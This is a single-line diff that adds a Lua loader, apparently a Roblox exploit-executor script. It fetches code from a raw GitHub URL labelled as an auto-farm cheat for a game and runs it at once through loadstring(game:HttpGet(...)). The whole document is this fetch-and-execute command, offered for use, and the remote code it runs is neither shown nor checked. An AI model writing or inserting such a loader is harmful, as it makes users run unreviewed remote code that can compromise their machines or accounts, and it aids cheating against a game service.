@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/flatterart99873/FlatterHub/main/CollectTheBody_AutoFarm"))()
